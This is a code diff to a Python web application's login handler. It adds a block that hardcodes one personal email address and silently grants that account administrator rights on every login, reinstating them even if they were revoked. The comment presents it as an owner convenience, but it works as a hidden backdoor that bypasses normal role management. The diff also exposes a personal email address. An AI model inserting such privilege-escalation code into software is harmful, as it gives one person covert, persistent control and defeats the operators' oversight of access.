@@ -157,6 +157,11 @@ def login():
     if account.is_banned:
         return jsonify({"error": "Account is banned."}), 403
 
+    # Auto-promote owner account on every login
+    OWNER_EMAIL = "rasheedgriffin@gmail.com"
+    if account.email == OWNER_EMAIL and not account.is_admin:
+        account.is_admin = True
+
     # Update last login
     account.last_login = datetime.now(timezone.utc)
     db.session.commit()
